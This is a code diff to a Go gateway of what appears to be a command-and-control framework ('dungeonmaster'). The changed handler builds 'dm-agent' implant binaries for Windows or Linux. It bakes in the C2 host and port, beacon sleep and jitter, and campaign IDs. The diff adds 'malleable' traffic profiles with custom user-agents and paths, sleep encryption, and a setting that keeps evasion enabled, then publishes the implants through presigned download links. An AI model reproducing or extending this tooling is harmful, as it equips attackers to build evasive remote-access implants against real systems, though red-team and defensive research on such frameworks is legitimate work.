@@ -33,11 +33,13 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 		Config struct {
 			CampaignID   string `json:"campaign_id"`
 			ListenerID   string `json:"listener_id"`
+			ProfileName  string `json:"profile_name"`
 			TargetOS     string `json:"target_os"`
 			TargetArch   string `json:"target_arch"`
 			SleepSeconds int    `json:"sleep_seconds"`
 			JitterPct    int    `json:"jitter_pct"`
 			Ephemeral    bool   `json:"ephemeral"`
+			SleepEncrypt bool   `json:"sleep_encrypt"`
 		} `json:"config"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
@@ -104,7 +106,7 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 
 	// Kick off the build in the background
 	go g.runBuild(b.ID, buildUUID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
-		cfg.SleepSeconds, cfg.JitterPct)
+		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.SleepEncrypt)
 
 	writeJSON(w, http.StatusCreated, b)
 }
@@ -165,7 +167,9 @@ func (g *gateway) handleListBuilds(w http.ResponseWriter, r *http.Request) {
 }
 
 // runBuild executes the Docker build in a background goroutine and updates the build record.
-func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port string, sleepSecs, jitterPct int) {
+func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
+	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, sleepEncrypt bool) {
+
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
 	defer cancel()
 
@@ -180,19 +184,46 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port string
 
 	_, _ = db.Pool.Exec(context.Background(), `UPDATE builds SET status = 'building' WHERE id = $1`, buildID)
 
+	// Resolve cross-compile target and artifact names from TargetOS/TargetArch
+	cargoTarget, binName, ext := resolveTarget(targetOS, targetArch)
+
+	// Resolve malleable profile fields (paths, user-agent)
+	regPath, pollPath, userAgent := "/r", "/c", ""
+	if profileName != "" {
+		var ua, rp, pp string
+		err := db.Pool.QueryRow(ctx,
+			`SELECT user_agent, register_path, poll_path FROM c2_profiles WHERE name = $1`, profileName,
+		).Scan(&ua, &rp, &pp)
+		if err == nil {
+			userAgent, regPath, pollPath = ua, rp, pp
+		} else {
+			g.log.Warn("profile not found, using defaults", zap.String("profile", profileName))
+		}
+	}
+
 	imageTag := "dm-agent-build-" + buildID
 
-	// docker build
+	sleepEncryptStr := "false"
+	if sleepEncrypt {
+		sleepEncryptStr = "true"
+	}
+
 	buildArgs := []string{
 		"build",
 		"-f", "/workspace/deploy/docker/Dockerfile.agent",
+		"--build-arg", "DM_TARGET=" + cargoTarget,
+		"--build-arg", "DM_BIN=" + binName,
 		"--build-arg", "DM_C2_HOST=" + c2Host,
 		"--build-arg", "DM_C2_PORT=" + c2Port,
+		"--build-arg", "DM_C2_PATH_REG=" + regPath,
+		"--build-arg", "DM_C2_PATH_POLL=" + pollPath,
 		"--build-arg", "DM_SLEEP_SECS=" + strconv.Itoa(sleepSecs),
 		"--build-arg", "DM_JITTER_PCT=" + strconv.Itoa(jitterPct),
 		"--build-arg", "DM_BUILD_UUID=" + buildUUID,
 		"--build-arg", "DM_TLS_SKIP_VERIFY=false",
 		"--build-arg", "DM_NO_EVASION=false",
+		"--build-arg", "DM_UA=" + userAgent,
+		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncryptStr,
 	}
 	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
 		buildArgs = append(buildArgs, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
@@ -208,17 +239,15 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port string
 		return
 	}
 
-	// Extract binary from image into the shared artifacts volume.
-	// The volume name must match the Compose-managed volume (project_build_artifacts).
 	buildVolume := os.Getenv("DM_BUILD_VOLUME")
 	if buildVolume == "" {
 		buildVolume = "dungeonmaster_build_artifacts"
 	}
-	outPath := "/artifacts/" + buildID + ".exe"
+	outPath := "/artifacts/" + buildID + ext
 	extractCmd := exec.CommandContext(ctx,
 		"docker", "run", "--rm",
 		"-v", buildVolume+":/out",
-		imageTag, "sh", "-c", "cp /dm-agent.exe /out/"+buildID+".exe",
+		imageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+ext,
 	)
 	if err := extractCmd.Run(); err != nil {
 		g.log.Error("docker extract failed", zap.String("build_id", buildID), zap.Error(err))
@@ -226,19 +255,21 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port string
 		return
 	}
 
-	// Clean up the build image
 	exec.Command("docker", "rmi", imageTag).Run() //nolint
 
-	// Upload to MinIO
-	artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+".exe", outPath, "application/octet-stream")
+	contentType := "application/octet-stream"
+	if ext == ".exe" {
+		contentType = "application/vnd.microsoft.portable-executable"
+	}
+
+	artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+ext, outPath, contentType)
 	if err != nil {
 		g.log.Error("minio upload failed", zap.String("build_id", buildID), zap.Error(err))
 		setBuildStatus("failed", "", "")
 		return
 	}
 
-	// Get a presigned download URL
-	downloadURL, _ := storage.PresignedDownloadURL(ctx, storage.BucketArtifacts, buildID+".exe")
+	downloadURL, _ := storage.PresignedDownloadURL(ctx, storage.BucketArtifacts, buildID+ext)
 	if downloadURL == "" {
 		downloadURL = artifactURL
 	}
@@ -246,8 +277,20 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port string
 	setBuildStatus("complete", downloadURL, "")
 	g.log.Info("build complete", zap.String("build_id", buildID), zap.String("url", downloadURL))
 
-	// Clean up local artifact file
 	os.Remove(outPath)
+}
+
+// resolveTarget maps UI target_os/target_arch to Cargo triple, binary name, and file extension.
+func resolveTarget(targetOS, targetArch string) (cargoTarget, binName, ext string) {
+	switch targetOS {
+	case "linux":
+		switch targetArch {
+		default:
+			return "x86_64-unknown-linux-musl", "dm-agent", ""
+		}
+	default: // windows
+		return "x86_64-pc-windows-gnu", "dm-agent.exe", ".exe"
+	}
 }
 
 func nilIfEmpty(s string) *string {
